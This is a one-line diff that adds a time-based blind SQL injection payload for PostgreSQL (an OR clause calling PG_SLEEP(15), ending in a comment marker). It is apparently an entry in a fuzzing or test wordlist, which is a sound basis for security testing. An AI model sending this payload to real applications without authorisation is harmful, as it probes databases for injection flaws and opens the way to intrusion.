@@ -1,0 +1,1 @@
+-1)) OR 78=(SELECT 78 FROM PG_SLEEP(15))--
